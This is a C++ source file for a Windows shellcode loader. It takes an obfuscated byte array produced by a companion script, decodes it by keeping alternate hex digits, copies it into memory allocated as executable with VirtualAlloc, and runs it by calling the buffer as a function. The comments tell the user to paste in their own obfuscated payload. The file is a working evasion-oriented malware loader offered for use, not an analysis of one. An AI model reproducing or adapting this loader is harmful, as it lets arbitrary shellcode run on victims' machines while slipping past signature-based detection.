#include <windows.h>
#include <iostream>
#include <string>
#include <algorithm>
#include <sstream>
#include  <iomanip>


using namespace std;

int main(){

	//PASTE THE OUTPUT FROM shell_o.py in here, *FOLLOW THE CHARACTER COUNT!*
	unsigned char s[] = 
    {"\x43\x21\x8d\x32\xfb\xe2\xf3\xc0\x66\x34\xf8\x0b\xc1\xd2\x08"
	"\xeb\x85\x72\x30\xac\x08\x0b\x05\x02\xc1\x6c\xd8\x0b\x74\xe2"
	"\xf0\x78\xb8\x7b\x77\xe2\x92\x00\xd8\x3b\x51\x92\x38\xa0\xd7"
	"\x6e\x90\x9c\xf3\xc3\x17\xf5\x7f\xc2\xd8\x59\xbc\xb7\x20\xe3"
	"\x37\x58\xc3\xbc\xf8\x0b\xf5\x17\x97\xc8\x50\x51\x7c\x02\x68"
	"\x7b\xc7\xba\xb2\xe0\x80\x01\xcc\x47\x63\xd1\x1e\xfd\xb8\x6b"
	"\xd3\xf4\xba\xdf\xb0\x01\xac\xe6\x04\x75\x58\x51\x23\x8e\x14"
	"\x26\x26\x01\xe7\x04\x86\x71\x87\x35\x5f\xb2\x98\x21\x57\x5e"
	"\x80\x58\x84\x95\xe7\xa8\xf6\xf9\x37\x04\x97\xc5\xae\xd9\x68"
	"\x8b\x37\x8a\x62\xd4\x00\x71\x0c\xc7\x46\x16\x58\xeb\xd2\x7c"
	"\xe6\x7f\x08\xcb\xa7\xda\x11\x9c\x40\x61\x1c\x97\x28\x2b\x97"
	"\x9c\x5a\xdf\x8f\x4c\x00\x11\x6c\xe7\x56\x18\xc7\x69\xb7\x34"
	"\x66\xd5\x60\xf1\x36\xc8\x96\xfb\x06\xa5\xc6\x9e\x04\x52\x66"
	"\xa8\x42\xa0\xd4\x62\x87\x32\xc6\xbf\xf8\x79\x2e\x11\x2f\x4e"
	"\x54\x59\x60\x8b\xa3\x81\xbc\xa0\xa5\x31\x95\x70\xff\x4f\x3d"
	"\xa7"};
	
	stringstream stream;

	for (int k = 0; k < sizeof s; k++){
		stream << setfill('0') << setw(2) << right << hex << (int)s[k];
	}

	//Removing the \x

	string coluna = stream.str();

	string result;

	for (int i = 1; i < coluna.size(); i = i + 2){ 
		result += coluna[i];
	}

	//Sending the deobfuscated shellcode to an string

	string newString;
	for (int i = 0; i < result.length(); i+=2)
	{
		string byte = result.substr(i, 2);
		char chr = (char)(int)strtol(byte.c_str(), NULL, 16);
		newString.push_back(chr);
	}

	//Allocating the shellcode in memory

	void *buffer = VirtualAlloc(0, newString.length(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	//Copying the bytes from the string to the allocated memory space
    
    RtlCopyMemory(buffer, newString.c_str(), newString.length());

    //Running the allocated memory region!

    ((void(*)())buffer)();
	
	return 0;
}